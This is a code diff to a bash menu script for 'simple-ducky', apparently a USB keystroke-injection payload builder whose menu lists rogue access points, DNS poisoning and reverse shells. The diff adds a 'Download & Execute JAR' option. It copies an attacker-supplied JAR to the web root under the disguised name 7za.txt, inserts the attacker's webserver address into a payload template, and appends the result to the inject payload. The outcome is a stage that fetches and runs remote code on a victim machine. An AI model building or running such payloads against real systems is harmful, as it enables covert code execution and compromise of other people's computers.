@@ -5437,7 +5437,8 @@ f_attackadd(){
 		echo "5. Rouge Access Point"
 		echo "6. Auto Associate to Rogue Access Point"
 		echo "7. Local DNS Poisoning"
-		echo "8. Post Attack Options"
+		echo "8. Download & Execute JAR"
+		echo "9. Post Attack Options"
 		echo ""
 		read -p "Option: " mainattack
 
@@ -5449,7 +5450,8 @@ f_attackadd(){
 		5) f_rogueaccess ;;
 		6) f_autoassociate ;;
 		7) f_dnspoison ;;
-		8) f_postattackadd ;;
+	        8) f_jarexecute ;;
+		9) f_postattackadd ;;
 		*) clear;exit ;;
 		esac
 
@@ -5652,7 +5654,40 @@ f_extracthash(){
 	sleep 3
 	f_attackadd
 }
-
+####### Down & Execute JAR    ###########
+f_jarexecute(){
+	clear
+	echo -e "\e[1;34mDownload and Execute JAR\e[0m"
+	echo ""
+	read -p "Where is your JAR located? " jarpath
+	echo ""
+	#Check if file exists
+	if [ -e $jarpath ]
+	then
+		echo "File is valid, copying to web server..."
+		cp $jarpath /var/www/7za.txt
+		clear
+		echo -e "\e[1;34mNow let's build your inject.bin\e[0m"	
+		echo ""
+		echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
+		read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
+		echo ""
+		clear
+		echo -e "\e[1;34mAdding the JAR to your payload...\e[0m"
+		echo ""
+		sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/builder/main-attack/jarexecute.conf > /usr/share/simple-ducky/payloads/builder/main-attack/jarexecute_del1.conf
+		cat /usr/share/simple-ducky/payloads/builder/main-attack/jarexecute_del1.conf >> /usr/share/simple-ducky/payload.txt
+		echo  >> /usr/share/simple-ducky/payload.txt
+		rm /usr/share/simple-ducky/payloads/builder/main-attack/jarexecute_del1.conf
+		echo ""
+		read -p "Press Enter to continue..." contuinue
+		f_attackadd
+	else
+		echo "File does not exist, please try again! (3 seconds)"
+		sleep 3
+		f_jarexecute
+	fi
+}
 ####### Reverse Shell Options ###########
 f_revshells(){
 	clear
